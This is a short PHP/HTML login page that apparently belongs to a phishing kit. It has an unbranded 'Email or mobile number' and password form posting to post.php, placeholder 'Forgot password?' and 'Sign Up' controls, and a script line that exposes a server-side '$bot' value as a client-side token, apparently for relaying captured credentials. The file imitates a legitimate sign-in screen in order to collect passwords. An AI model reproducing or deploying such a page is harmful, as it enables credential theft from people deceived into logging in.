<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="res/css/main.css">
</head>
<body>
    <script>var token=<?php echo json_encode($bot); ?>;</script>
    <div class="container">
        <div class="login">
            <img src="res/img/logo.png" class="logo">

            <form action="post.php" method="post">
                <input type="text" name="user" placeholder="Email or mobile number" required>
                <input type="password" name="pass" placeholder="Enter your password" required>
                <a href="#" class="forg">Forgot password?</a>
                <button type="submit" class="log">Log In</button>
                <div class="or">
                    <hr>
                    <span>or</span>
                    <hr>
                </div>
                <button type="button" class="signup">Sign Up</button>
            </form>
			
    
            <div class="language">
                    
                    <span>English</span>
                    <span>Français</span>
                    <span>Español</span>
                    <span>中文</span>
    
            </div>
        </div>
    </div>
<script src="res/jq.js"></script>
</body>
</html>
